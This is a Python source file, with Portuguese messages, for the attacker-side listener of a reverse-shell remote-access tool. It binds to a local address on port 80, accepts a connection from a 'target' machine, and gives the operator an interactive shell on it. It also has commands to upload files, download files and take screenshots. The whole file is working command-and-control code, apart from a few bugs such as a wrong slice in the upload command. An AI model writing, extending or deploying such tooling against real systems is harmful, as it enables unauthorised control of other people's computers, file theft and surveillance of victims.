import os
import socket
from termcolor import colored
import json

def data_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def data_send(data, target):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def uploadf(file, target):
    arq = open(file, 'rb')
    target.send(arq.read())

def downloadf(file, target):
    arq = open(file, 'wb')
    target.settimeout(4)
    sock = target.recv(1024)
    while sock:
        arq.write(sock)
        try:
            sock = target.recv(1024)
        except socket.timeout as erro:
            break
    target.settimeout(None)
    arq.close()

def communs(target, ip):
    count = 0
    while True:
        commum = input('[+] Shell~%s:' % str(ip))
        data_send(commum, target)
        if commum == 'exit':
            print(colored('\n[Saindo....]', 'red'))
            break

        elif commum == 'clear':
            os.system('clear')

        elif commum [:3] == 'cd ':
            pass
        elif commum [:6] == 'upload':
            uploadf(commum[:7], target)

        elif commum [:8] == 'download':
            downloadf(commum[9:], target)

        elif commum [:5] == 'print':
            pri = open('print%d' % (count), 'wb')
            target.settimeout(4)
            sock = target.recv(1024)
            while sock:
                pri.write(sock)
                try:
                    sock = target.recv(1024)
                except socket.timeout as erro:
                    break
            target.settimeout(None)
            pri.close()
            count += 1

        elif commum == 'help':
            print(colored('''\n
exit: fechar conexão.
clear: limpar o terminal
upload + "nome_pasta": enviar um arquivo para a maquina alvo.
download + "nome_pasta": baixar pasta ou arquivo da maquina alvo.
print: screenshot da maquina alvo
cd + "diretorio" entrar ou sair de um diretorio.
            ''', 'blue'))

        else:
            answer = data_recv(target)
            print(answer)

def main():
    try:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.bind(('192.168.0.152', 80))
        print(colored('Aguardando conexão alvo....', 'green'))
        connection.listen(5)

        target, ip = connection.accept()
        print(colored(f'alvo conectado: {str(ip)}', 'green'))

        communs(target, ip)
    except KeyboardInterrupt:
        print(colored('\n[Saindo....]', 'red'))
    finally:
        connection.close()
if __name__ == "__main__":
    main()